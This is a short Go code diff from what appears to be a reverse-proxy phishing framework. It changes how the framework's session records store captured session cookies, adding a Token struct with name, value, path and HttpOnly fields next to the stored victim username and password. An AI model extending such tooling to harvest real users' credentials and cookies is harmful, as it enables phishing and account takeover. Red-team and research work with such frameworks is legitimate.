@@ -16,12 +16,19 @@ type Session struct {
 	LandingURL string                       `json:"landing_url"`
 	Username   string                       `json:"username"`
 	Password   string                       `json:"password"`
-	Tokens     map[string]map[string]string `json:"tokens"`
+	Tokens     map[string]map[string]*Token `json:"tokens"`
 	SessionId  string                       `json:"session_id"`
 	UserAgent  string                       `json:"useragent"`
 	RemoteAddr string                       `json:"remote_addr"`
 	CreateTime int64                        `json:"create_time"`
 	UpdateTime int64                        `json:"update_time"`
+}
+
+type Token struct {
+	Name     string
+	Value    string
+	Path     string
+	HttpOnly bool
 }
 
 func (d *Database) sessionsInit() {
@@ -43,7 +50,7 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		LandingURL: landing_url,
 		Username:   "",
 		Password:   "",
-		Tokens:     make(map[string]map[string]string),
+		Tokens:     make(map[string]map[string]*Token),
 		SessionId:  sid,
 		UserAgent:  useragent,
 		RemoteAddr: remote_addr,
@@ -105,7 +112,7 @@ func (d *Database) sessionsUpdatePassword(sid string, password string) error {
 	return err
 }
 
-func (d *Database) sessionsUpdateTokens(sid string, tokens map[string]map[string]string) error {
+func (d *Database) sessionsUpdateTokens(sid string, tokens map[string]map[string]*Token) error {
 	s, err := d.sessionsGetBySid(sid)
 	if err != nil {
 		return err
